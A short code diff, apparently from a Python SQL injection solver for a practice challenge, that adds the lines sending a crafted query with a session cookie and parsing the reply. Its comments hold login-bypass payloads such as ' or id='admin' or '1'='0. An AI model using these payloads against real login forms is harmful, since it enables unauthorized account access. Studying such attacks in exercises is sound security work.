@@ -17,6 +17,9 @@ sql = urllib.parse.quote(sql)
 query_url = "%s?%s=%s" % (url,parameter,sql)
 print("[*]%s" % query_url)
 
+http_request=requests.get(query_url,cookies=cookie)
+res = bs(http_request.text,"html.parser")
+
 # pw=' or id='admin' or '1'='0
 
 # id=guest and pw='' or id='admin' or'1'='0' and 1=0
